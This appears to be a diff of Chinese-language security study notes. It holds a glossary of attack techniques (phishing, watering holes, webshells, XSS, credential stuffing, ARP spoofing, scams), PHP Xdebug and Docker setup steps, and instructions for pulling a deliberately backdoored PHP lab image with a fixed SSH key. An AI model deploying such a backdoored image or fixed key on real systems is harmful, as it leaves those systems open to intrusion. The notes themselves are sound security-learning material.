+<p>诈骗者通常会将自己伪装成网络银行，在线零售商和信用卡公司等可信的品牌，骗取用户的私人信息或邮件账号口令</p>
+<p>受骗者往往会泄露自己的邮箱，私人资料，如信用卡，银行卡账户，身份证等内容</p>
+<h4 id="鱼叉攻击"><a href="#鱼叉攻击" class="headerlink" title="鱼叉攻击"></a>鱼叉攻击</h4><p>鱼叉攻击是将用鱼叉捕鱼形象的引入到了网络攻击中，主要是指可以使欺骗性电子邮件看起来更加可信的网络钓鱼攻击，具有更高的成功可能性</p>
+<p>不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往“见鱼而使叉”</p>
+<p>为了实现这一目标，攻击者将尝试在目标上收集尽可能多的信息，通常组织内的特定个人存在某些安全漏洞</p>
+<h4 id="钓鲸攻击"><a href="#钓鲸攻击" class="headerlink" title="钓鲸攻击"></a>钓鲸攻击</h4><p>捕鲸是另一种进化形式的鱼叉式网络钓鱼，它指的是针对高级管理人员和组织内其他高级人员的网络钓鱼攻击</p>
+<p>通过使电子邮件内容具有个性化并针对相关目标进行定制的攻击</p>
+<h4 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h4><p>顾名思义，是在受害人必经之路设置了一个“水坑（陷阱）”</p>
+<p>最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网络就会“中招”</p>
+<h4 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h4><p>嗅探指的是对局域网中的数据包进行截取及分析，从中获取有效信息</p>
+<h4 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h4><p>即高级可持续威胁攻击，指某组织在网络上对特定的对象展开的持续有效的攻击活动</p>
+<p>这种攻击活动具有极强的隐蔽性和针对性，通常会运行受感染的各种介质，供应链和社会工程学等多种手段实施先进的，持久的且有效的威胁和攻击</p>
+<h4 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h4><p>cs全称为：Command and Control，命令与控制，常见于APT攻击场景中，作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时为攻击者的“基础设施”</p>
+<h4 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h4><p>是黑客攻击目标机构的合作伙伴，并以该合作伙伴为跳板，达到渗透目标用户的目的</p>
+<p>一种常见的表现形式为，用户对厂商产品的信任，在厂商产品下载安装或者更新时进行恶意软件植入进行攻击</p>
+<p>所以，在某些软件下载平台下载的时候，若遭遇捆绑软件，就得小心了</p>
+<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><p>社会工程学是通过操纵人的心理、行为或信任来获取信息、权限等目标的非技术手段，核心作用是绕开技术防御达成目的</p>
+<p>信息收集：通过伪装身份（如客服、同事）套取个人隐私、企业内部信息等关键数据。</p>
+<p>突破防御：绕开防火墙、密码等技术屏障，让目标主动提供账号密码、打开恶意文件。</p>
+<p>促成行动：诱导目标执行特定操作，比如转账、安装不明软件、泄露内部流程。</p>
+<h4 id="拿站"><a href="#拿站" class="headerlink" title="拿站"></a>拿站</h4><p>指得到一个网站的最高权限，比如说电脑非系统管理员就无法访问一些C盘的东西，而系统管理员可以，通过一定的手段让普通用户提升成为管理员，让其拥有管理员的权限，这就是提权</p>
+<h4 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h4><p>通过扫描检测你的网络设备及系统有没有安全漏洞，有的话就可能被入侵，就像一滴水透过一块有漏洞的木板，渗透成功就是系统被入侵</p>
+<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统</p>
+<h4 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h4><p>一个具有辅助作用的机器，利用这个主机作为一个间隙工具，来入侵其他主机，一般和肉鸡连用 — 用作代理服务器</p>
+<h4 id="网马–淘汰"><a href="#网马–淘汰" class="headerlink" title="网马–淘汰"></a>网马–淘汰</h4><p>在网页中植入木马，当打开网页的时候就运行了木马程序 — 成功率几乎为0！！！</p>
+<h4 id="箱子–淘汰"><a href="#箱子–淘汰" class="headerlink" title="箱子–淘汰"></a>箱子–淘汰</h4><p>别人通过将木马挂在网页上然后别人点击了这个网页某些功能就中了木马，登录其他网站后木马就会记录这个人的账号密码然后发到挂木马这个人的指定的一个地方 —- “黑吃黑”  — 小马（经典的php）拉大马（木马，选择使用必死无疑）</p>
+<h4 id="黑页–淘汰"><a href="#黑页–淘汰" class="headerlink" title="黑页–淘汰"></a>黑页–淘汰</h4><p>黑客攻击成功后，在网站上留下的黑客入侵成功的页面，用于炫耀攻击成果</p>
+<h4 id="暗链–淘汰"><a href="#暗链–淘汰" class="headerlink" title="暗链–淘汰"></a>暗链–淘汰</h4><p>看不见的网站链接，“暗链”在网站中的链接做的非常隐蔽，短时间内不易被搜索引擎察觉</p>
+<p>它和友情链接有相似之处，可以有效地提高网站权重  —  黑帽seo</p>
+<h4 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h4><p>拖库本来是数据库领域的术语，指从数据库中导出数据</p>
+<p>在网络攻击领域，它被用来指网站遭到入侵后，黑客窃取其数据库文件</p>
+<p>— 要想富先拖库</p>
+<h4 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h4><p>撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登录其他网站后，得到一系列可以登录的用户</p>
+<p>很多用户在不同网站使用的是相同的账号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网站，这就可以理解为撞库攻击</p>
+<h4 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h4><p>入侵网站的一种手法，通过恶意代码让网站爆出其一些敏感数据来</p>
+<h4 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h4><p>即Challenge  Collapsar，名字来源于对抗国内安全厂商绿盟科技早期的抗拒绝服务产品黑洞，攻击者借助代理服务器生成指向受害者主机的涉及大量占用系统资源的合法请求，耗尽目标的处理资源，达到拒绝服务的目的</p>
+<h4 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h4><p>已app，php，jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称作是一种网页后门，可以上传下载文件，查看数据库，执行任意程序命令等</p>
+<h4 id="跨站攻击"><a href="#跨站攻击" class="headerlink" title="跨站攻击"></a>跨站攻击</h4><p>简称XSS，是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料，利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式</p>
+<h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><p>中间人攻击是一种”间接“的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而这台计算机就称为”中间人“</p>
+<p>— 可能性越来越小</p>
+<h4 id="薅羊毛"><a href="#薅羊毛" class="headerlink" title="薅羊毛"></a>薅羊毛</h4><p>指网赚一族利用各种网络金融产品或者红包活动推广下线抽成赚钱，又泛指收集各个银行等金融机构及各类商家的优惠信息，以此实现盈利的目的，这类行为就称为薅羊毛</p>
+<h4 id="商业电子邮件攻击（BEC"><a href="#商业电子邮件攻击（BEC" class="headerlink" title="商业电子邮件攻击（BEC)"></a>商业电子邮件攻击（BEC)</h4><p>也被称为”变脸诈骗“攻击，这是针对高层管理人员的攻击，攻击者通常冒充（盗用）决策者的邮件，来下达与资金、利益相关的指令；或者攻击者依赖社会工程学制作电子邮件，说服&#x2F;诱导高管短时间进行经济交易</p>
+<h4 id="电信诈骗"><a href="#电信诈骗" class="headerlink" title="电信诈骗"></a>电信诈骗</h4><p>指通过电话、网络和短信方式，编造虚假信息，设置骗局，对受害人实施远程，非接触式诈骗，诱使受害人打款或转账的犯罪行为，通常以冒充他人及仿冒、伪造各种合法外衣和形式的方式达到欺骗的目的</p>
+<h4 id="杀猪盘"><a href="#杀猪盘" class="headerlink" title="杀猪盘"></a>杀猪盘</h4><p>网络流行词，电信诈骗的一种，是一种网络交友诱导股票投资、赌博等类型的诈骗方式，”杀猪盘“则是”从业者们“自己起的名字，是指放长线”养猪“诈骗，养的越久，诈骗的越狠</p>
+<h4 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h4><p>ARP协议的基本功能是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行</p>
+<p>基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内含有与当前设备重复的mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信</p>
+<h4 id="欺骗攻击"><a href="#欺骗攻击" class="headerlink" title="欺骗攻击"></a>欺骗攻击</h4><p>网络欺骗达到技术有：HONEYPOT和分布式HONEYPOT、欺骗空间技术等</p>
+<p>主要方式：IP欺骗、ARP欺骗、DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法的通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等</p>
+<h4 id="域名劫持"><a href="#域名劫持" class="headerlink" title="域名劫持"></a>域名劫持</h4><p>域名劫持是通过拦截域名解析请求或篡改域名服务器上的数据，使得用户在访</p>
+<p>问相关域名时返回虚假IP地址或使其用户的请求失败</p>
+<h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><p>一段可以被操作系统无需特别定位处理的指令，通常在利用漏洞后执行的恶意代码，shellcode为二进制的机器码，因为经常让攻击者获得shell而出名</p>
+<h4 id="物理攻击"><a href="#物理攻击" class="headerlink" title="物理攻击"></a>物理攻击</h4><p>通俗易懂，即采用物理接触而非技术手段达到网络入侵的目的，最常见的表现为插u盘</p>
+<p>著名的震网病毒事件即通过插u盘的形式感染了伊朗核设施</p>
+<h4 id="垃圾邮件"><a href="#垃圾邮件" class="headerlink" title="垃圾邮件"></a>垃圾邮件</h4><p>是指未经用户许可（与用户无关）就强行发送到用户邮箱中的电子邮件</p>
+<h2 id="6-vscode中phpdebug环境配置"><a href="#6-vscode中phpdebug环境配置" class="headerlink" title="6.vscode中phpdebug环境配置"></a>6.vscode中phpdebug环境配置</h2><h3 id="1-基础的底层环境安装"><a href="#1-基础的底层环境安装" class="headerlink" title="1.基础的底层环境安装"></a>1.基础的底层环境安装</h3><p>phpstudy安装，vscode安装，在VSCode中安装PHP Debug插件</p>
+<h3 id="2-具体措施"><a href="#2-具体措施" class="headerlink" title="2.具体措施"></a>2.具体措施</h3><p>1.安装好phpstudy后部署好nginx环境和php环境</p>
+<p>2.打开环境</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113111435714.png" alt="image-20260113111435714"></p>
+<p>3.打开php配置</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113111555604.png" alt="image-20260113111555604"></p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113111610943.png" alt="image-20260113111610943"></p>
+<p>4.然后进入网站，查看php版本，xedebug扩展是否打开，然后打开根目录创建一个新的test.php文件</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113111740218.png" alt="image-20260113111740218"></p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113111903129.png" alt="image-20260113111903129"></p>
+<p>5.打开创建的php文件，在其中输入&lt;?php phpinfo();   — 由于创建部署在本地的127.0.0.1，进入浏览器打开127.0.0.1&#x2F;test.php查看是否成功进入，若成功然后复制源码</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113112209075.png" alt="image-20260113112209075"></p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113112234084.png" alt="image-20260113112234084"></p>
+<p>6.然后进入到vscode提供的xedebug官网，粘贴所获得的全部源码，即可获得所需要的xedebug安装版本，配置路径<img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113112552149.png" alt="image-20260113112552149"></p>
+<p>7.由于获得的是我们所需要的版本，故而删除原本的xedebug.dll，然后进行自动获取，在php.ini中更改配置，在vscode中选择v3的内容模块粘贴</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113113902236.png" alt="image-20260113113902236"></p>
+<p>8.成功以后在vscode中进行调试</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113115514734.png" alt="image-20260113115514734"></p>
+<h2 id="6-php实验后门"><a href="#6-php实验后门" class="headerlink" title="6.php实验后门"></a>6.php实验后门</h2><h1 id="二、第二天"><a href="#二、第二天" class="headerlink" title="二、第二天"></a>二、第二天</h1><h2 id="1-php和doker拉取配置"><a href="#1-php和doker拉取配置" class="headerlink" title="1.php和doker拉取配置"></a>1.php和doker拉取配置</h2><h3 id="php配置（已完成）"><a href="#php配置（已完成）" class="headerlink" title="php配置（已完成）"></a>php配置（已完成）</h3><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h3 id="1-配置思路"><a href="#1-配置思路" class="headerlink" title="1.配置思路"></a>1.配置思路</h3><p>1.保证虚拟机使用nat，即可以使虚拟机可以使用物理机的网络代理</p>
+<p>2.在虚拟机里面手动创建一个docker存储目录</p>
+<p>3.首先尝试不使用代理直接进行docker抓取</p>
+<p>4.如若不行，则进行环境配置，选择物理机ip或者网卡的ip，端口使用vpn的正确代理端口，同时打开局域网代理</p>
+<p>5.使用正确的代理端口后，尝试是否能够正常出网</p>
+<p>6.然后在proxychains底层配置端口和ip</p>
+<p>7.在 VMware 虚拟机（Ubuntu）中共享 Windows 主机的 VPN 连接，主要有两种最稳妥的方案。</p>
+<p>这就取决于你的 VPN 软件类型：</p>
+<p>方案一（推荐）： 代理共享模式（适用于 Clash, v2rayN 等代理类软件）。</p>
+<p>方案二（硬核）： TUN&#x2F;TAP 模式（适用于 OpenVPN, Cisco AnyConnect 或开启了 TUN 模式的代理软件）。</p>
+<p>准备工作<br>无论使用哪种方案，请先确保 VMware 的网络设置正确：</p>
+<p>虚拟机网络模式： 必须设置为 NAT 模式 (Network Address Translation)。</p>
+<p>理由： NAT 模式下，虚拟机和主机在同一个虚拟局域网内，虚拟机可以通过主机的 IP 访问主机。</p>
+<p>方案一：代理共享模式（最通用，适用于大多数情况）<br>如果你的 VPN 软件只是在本地开启了一个 HTTP&#x2F;SOCKS 代理端口（例如 Clash, v2rayN），这是最稳定的方法。</p>
+<p>第一步：Windows 主机设置<br>打开你的 VPN 软件设置。</p>
+<p>找到 “允许来自局域网的连接” (Allow LAN) 选项并开启。</p>
+<p>记录下 端口号（通常是 HTTP 端口 7890 或 10809 等）。</p>
+<p>查看 Windows 本机在 VMware Network Adapter VMnet8 也就是 NAT 网卡下的 IP 地址：</p>
+<p>打开 CMD，输入 ipconfig。</p>
+<p>找到 Ethernet adapter VMware Network Adapter VMnet8。</p>
+<p>记下 IPv4 Address (例如 192.168.100.1)。这是虚拟机眼中的“网关”或“主机”。</p>
+<p>第二步：配置 Ubuntu 环境变量 (实现“永久”生效)<br>你需要告诉 Ubuntu 所有的网络请求都走 Windows 的这个 IP 和端口。</p>
+<p>打开 Ubuntu 终端。</p>
+<p>编辑环境变量文件：</p>
+<p>nano ~&#x2F;.bashrc<br>在文件末尾添加以下内容（注意替换为你的 VMnet8 IP 和 端口）：</p>
+<p>替换 192.168.100.1 为你在 CMD 中查到的 VMnet8 的 IP</p>
+<p>替换 7890 为你 VPN 软件的 HTTP 端口</p>
+<p>export hostip&#x3D;”192.168.100.1”<br>export port&#x3D;”7890”</p>
+<p>export http_proxy&#x3D;”http:&#x2F;&#x2F;${hostip}:${port}”<br>export https_proxy&#x3D;”http:&#x2F;&#x2F;${hostip}:${port}”<br>export all_proxy&#x3D;”socks5:&#x2F;&#x2F;${hostip}:${port}” # 如果你的软件支持socks5<br>(这一步能保证你在终端里使用 curl, wget, git 等命令时走代理)</p>
+<p>source ~&#x2F;.bashrc</p>
+<h3 id="第一部分：极简安装-Docker"><a href="#第一部分：极简安装-Docker" class="headerlink" title="第一部分：极简安装 Docker"></a>第一部分：极简安装 Docker</h3><ol>
+<li><p>sudo apt remove docker docker-engine docker.io containerd runc</p>
+</li>
+<li><p>sudo apt update<br>sudo apt install apt-transport-https ca-certificates curl software-properties-common gnupg</p>
+</li>
+<li><p>curl -fsSL <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5kb2NrZXIuY29tL2xpbnV4L3VidW50dS9ncGc=">https://download.docker.com/linux/ubuntu/gpg</span> | sudo gpg –dearmor -o &#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg</p>
+</li>
+<li><p>echo “deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg] <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5kb2NrZXIuY29tL2xpbnV4L3VidW50dQ==">https://download.docker.com/linux/ubuntu</span> $(lsb_release -cs) stable” | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null</p>
+</li>
+<li><p>sudo apt update<br>sudo apt install docker-ce docker-ce-cli containerd.io</p>
+</li>
+</ol>
+<hr>
+<h3 id="第二部分：核心难点——解决“拉取不到镜像”"><a href="#第二部分：核心难点——解决“拉取不到镜像”" class="headerlink" title="第二部分：核心难点——解决“拉取不到镜像”"></a>第二部分：核心难点——解决“拉取不到镜像”</h3><p>这是所有国内 Docker 初学者遇到的<strong>最大拦路虎</strong>。当你执行 <code>docker pull</code> 时，经常会卡住或报错 <code>TLS handshake timeout</code>。这是因为 Docker Hub 的官方服务器在海外。</p>
+<blockquote>
+<p>出现的报错示例：</p>
+<p>root@gx-VMware-Virtual-Platform:~# docker pull nginx<br>Using default tag: latest<br>Error response from daemon: failed to resolve reference “docker.io&#x2F;library&#x2F;nginx:latest”: failed to do request: Head “<span class="exturl" data-url="aHR0cHM6Ly9yZWdpc3RyeS0xLmRvY2tlci5pby92Mi9saWJyYXJ5L25naW54L21hbmlmZXN0cy9sYXRlc3Q=">https://registry-1.docker.io/v2/library/nginx/manifests/latest</span>“: dial tcp 128.242.240.117:443: connect: connection refused</p>
+</blockquote>
+<p>针对这个问题，我为你整理了<strong>三种</strong>不同层级的解决方案：</p>
+<h4 id="方案一：配置国内镜像加速器（基础方案）"><a href="#方案一：配置国内镜像加速器（基础方案）" class="headerlink" title="方案一：配置国内镜像加速器（基础方案）"></a>方案一：配置国内镜像加速器（基础方案）</h4><p>这是最常规的方法，但近期国内很多镜像站（如阿里云、网易等）经常不稳定。建议优先尝试，不行再换方案二。</p>
+<ol>
+<li><p>创建或修改配置文件：（用vim编辑也可，只是需要apt-get install vim）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo nano /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在文件中粘贴以下内容（这里提供几个目前相对可用的）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="line">    &quot;https://huecker.io&quot;,</span><br><span class="line">    &quot;https://dockerhub.timeweb.cloud&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>保存退出（按 <code>Ctrl+O</code> 回车，再按 <code>Ctrl+X</code>）。</p>
+</li>
+<li><p>重启 Docker 服务让配置生效：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="方案二：配置-Docker-代理（进阶稳妥方案）"><a href="#方案二：配置-Docker-代理（进阶稳妥方案）" class="headerlink" title="方案二：配置 Docker 代理（进阶稳妥方案）"></a>方案二：配置 Docker 代理（进阶稳妥方案）</h4><p><strong>如果你有自己的 VPN 或代理节点</strong>（比如你的物理机上开了代理，或者局域网内有代理服务器），让 Docker 走代理是最稳的。</p>
+<blockquote>
+<p><strong>注意：</strong> Docker 拉取镜像不走系统环境变量的代理，必须单独配置 systemd。</p>
+</blockquote>
+<ol>
+<li><p>创建配置目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建代理文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/systemd/system/docker.service.d/http-proxy.conf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>粘贴以下内容（<strong>假设你的代理在 192.168.1.100 的 7890 端口</strong>，请根据实际情况修改）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://192.168.1.100:7890&quot;</span><br><span class="line">Environment=&quot;HTTPS_PROXY=http://192.168.1.100:7890&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重启服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="第三部分：渗透测试常用-Docker-操作速查"><a href="#第三部分：渗透测试常用-Docker-操作速查" class="headerlink" title="第三部分：渗透测试常用 Docker 操作速查"></a>第三部分：渗透测试常用 Docker 操作速查</h3><p>搭建好环境后，我们来实战。不讲虚的，只讲你做实验、搭靶场最常用的命令。</p>
+<h4 id="1-概念速解"><a href="#1-概念速解" class="headerlink" title="1. 概念速解"></a>1. 概念速解</h4><ul>
+<li><strong>镜像 (Image):</strong> 相当于“光盘”或“安装包”。（只读的）</li>
+<li><strong>容器 (Container):</strong> 相当于“运行起来的系统”。（可读写的）</li>
+</ul>
+<h4 id="2-只有-5-个命令的“生存指南”"><a href="#2-只有-5-个命令的“生存指南”" class="headerlink" title="2. 只有 5 个命令的“生存指南”"></a>2. 只有 5 个命令的“生存指南”</h4><p>假设我们要搭建一个 <code>nginx</code> web服务器做测试。</p>
+<p><strong>Step 1: 运行容器 (Run)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 格式: docker run -d -p [宿主机端口]:[容器内部端口] --name [起个名字] [镜像名]</span><br><span class="line">sudo docker run -d -p 8080:80 --name my-web nginx</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-d</code>: 后台运行（不占用你当前的终端）。</li>
+<li><code>-p 8080:80</code>: 最关键！把你的 Ubuntu 的 8080 端口映射给容器的 80 端口。</li>
+<li><strong>测试：</strong> 打开浏览器访问 <code>http://localhost:8080</code>，你应该能看到 Nginx 欢迎页。</li>
+</ul>
+<p><strong>Step 2: 查看正在运行的容器 (Ps)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>你能看到容器 ID、状态、端口映射情况。如果不加参数，只显示运行中的；<code>docker ps -a</code> 显示所有的。</li>
+</ul>
+<p><strong>Step 3: 进入容器内部 (Exec)</strong></p>
+<p>这就好比 SSH 连进了一台虚拟机，适合进去修改配置文件或查看 Flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 格式: docker exec -it [容器名/ID] /bin/bash</span><br><span class="line">sudo docker exec -it my-web /bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>退出容器输入 <code>exit</code> 即可。</li>
+</ul>
+<p><strong>Step 4: 停止与启动 (Stop&#x2F;Start)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker stop my-web  # 关机</span><br><span class="line">sudo docker start my-web # 开机</span><br></pre></td></tr></table></figure>
+
+<p>Step 5: 删除容器 (Rm)</p>
+<p>做完实验，清理现场。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker stop my-web  # 先停止</span><br><span class="line">sudo docker rm my-web    # 再删除</span><br><span class="line"># 如果想连镜像也删了： docker rmi nginx</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="第四部分：常见“坑点”排雷指南"><a href="#第四部分：常见“坑点”排雷指南" class="headerlink" title="第四部分：常见“坑点”排雷指南"></a>第四部分：常见“坑点”排雷指南</h3><h4 id="坑点-2：端口冲突-Bind-for-0-0-0-0-xx-failed"><a href="#坑点-2：端口冲突-Bind-for-0-0-0-0-xx-failed" class="headerlink" title="坑点 2：端口冲突 (Bind for 0.0.0.0:xx failed)"></a>坑点 2：端口冲突 (Bind for 0.0.0.0:xx failed)</h4><p>现象： 运行容器时报错：port is already allocated。</p>
+<p>原因： 你指定的宿主机端口（冒号左边的端口）已经被别的程序占用了。</p>
+<p>解决： 换个端口。比如原命令是 -p 80:80，改成 -p 8081:80 即可。</p>
+<h4 id="坑点-3：名字冲突-The-container-name-“-xxx”-is-already-in-use"><a href="#坑点-3：名字冲突-The-container-name-“-xxx”-is-already-in-use" class="headerlink" title="坑点 3：名字冲突 (The container name “&#x2F;xxx” is already in use)"></a>坑点 3：名字冲突 (The container name “&#x2F;xxx” is already in use)</h4><p>现象： 再次运行同一个 docker run 命令报错。</p>
+<p>原因： 即使容器停止了，它还在那躺着（类似关机的电脑）。你不能创建一个同名的新容器。</p>
+<p>解决：</p>
+<ol>
+<li>删除旧的：<code>docker rm [容器名]</code></li>
+<li>或者给新的容器起个不同的名字：<code>--name my-web-2</code></li>
+</ol>
+<h3 id="第五部分：vscode远程连接docker"><a href="#第五部分：vscode远程连接docker" class="headerlink" title="第五部分：vscode远程连接docker"></a>第五部分：vscode远程连接docker</h3><h4 id="1-在vscode里面下载好相关的扩展程序"><a href="#1-在vscode里面下载好相关的扩展程序" class="headerlink" title="1.在vscode里面下载好相关的扩展程序"></a>1.在vscode里面下载好相关的扩展程序</h4><p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113180516654.png" alt="image-20260113180516654"></p>
+<p>然后在vscode里面进行远程连接</p>
+<h4 id="2-虚拟机的远程连接"><a href="#2-虚拟机的远程连接" class="headerlink" title="2.虚拟机的远程连接"></a>2.虚拟机的远程连接</h4><p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113180838616.png" alt="image-20260113180838616"></p>
+<p>1.添加虚拟机的ip和正常外部连接一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.147.128</span><br></pre></td></tr></table></figure>
+
+<p>2.成功跳转以后输入虚拟机的密码</p>
+<h4 id="3-下载调试docker环境"><a href="#3-下载调试docker环境" class="headerlink" title="3.下载调试docker环境"></a>3.下载调试docker环境</h4><p>1.下载已经Build好的镜像：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tuwen/phpsrc-debug:8.1-backdoor</span><br></pre></td></tr></table></figure>
+
+<p>2.运行容器，在本地的docker仓库，查看客户机的端口是否被占用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --name debug -p 8081:8080 -p 2222:22 docker.io/tuwen/phpsrc-debug:8.1-backdoor</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>3.运行成功后，目标会启动ssh，并输出一个私钥（勿在生产环境下使用这个镜像，因为私钥是固定的）保存在自己主机windows下  private.key</p>
